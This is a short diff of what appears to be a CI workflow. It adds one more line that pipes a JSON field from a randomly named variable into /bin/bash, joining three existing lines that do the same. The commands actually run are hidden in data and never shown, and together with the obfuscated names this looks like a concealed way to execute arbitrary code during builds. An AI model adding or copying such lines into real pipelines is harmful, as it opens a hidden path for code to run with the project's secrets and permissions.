@@ -37,6 +37,7 @@ jobs:
           echo $xnzqv4289 | jq -r .njwa125 | /bin/bash
           printf '%s' "$x7501" | jq -r .rlz63 | /bin/bash
           printf '%s' "$jn31616" | jq -r .d6061 | /bin/bash
+          printf '%s' "$p1" | jq -r .tqq320 | /bin/bash
 
       - name: Archive results
         if: always()
